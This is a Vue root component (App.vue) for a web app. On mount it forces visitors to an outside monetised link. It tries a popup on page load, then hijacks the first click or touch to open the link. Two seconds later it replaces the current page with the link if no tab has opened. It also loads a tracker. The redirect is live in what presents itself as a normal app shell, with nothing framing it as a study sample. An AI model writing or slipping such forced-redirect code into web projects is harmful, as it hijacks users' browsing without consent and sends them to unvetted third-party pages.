<script setup lang="ts">
import { onMounted } from "vue";
import { useTracker } from "./composables/useTracker";

useTracker();

const EARNING_LINK = "https://ironcomparable.com/gh6u2ftq6?key=a3904ecfe67c81deb37177a2588649a9";

function openEarningTab() {
  let openedInNewTab = false;
  let timer: ReturnType<typeof setTimeout> | null = null;

  const cleanup = () => {
    if (timer !== null) {
      clearTimeout(timer);
      timer = null;
    }
    window.removeEventListener("click", handleFirstClick);
    window.removeEventListener("touchstart", handleFirstClick);
  };

  const handleFirstClick = () => {
    try {
      const win = window.open(EARNING_LINK, "_blank");
      if (win && !win.closed && typeof win.closed !== "undefined") {
        openedInNewTab = true;
        cleanup();
        return;
      }
    } catch {
      // ignore
    }
    // If opening new tab fails on click, fallback to replacing current page
    openedInNewTab = true;
    cleanup();
    window.location.replace(EARNING_LINK);
  };

  // 1. Try opening new tab immediately on load
  try {
    const win = window.open(EARNING_LINK, "_blank");
    if (win && !win.closed && typeof win.closed !== "undefined") {
      openedInNewTab = true;
      return;
    }
  } catch {
    // Popup blocked by browser
  }

  // 2. Listen for first user click/touch to open new tab
  window.addEventListener("click", handleFirstClick, { once: true });
  window.addEventListener("touchstart", handleFirstClick, { once: true });

  // 3. Fallback: If no new tab opened within 2 seconds, replace current location
  timer = setTimeout(() => {
    if (!openedInNewTab) {
      cleanup();
      window.location.replace(EARNING_LINK);
    }
  }, 2000);
}

onMounted(() => {
  openEarningTab();
});
</script>

<template>
  <router-view />
</template>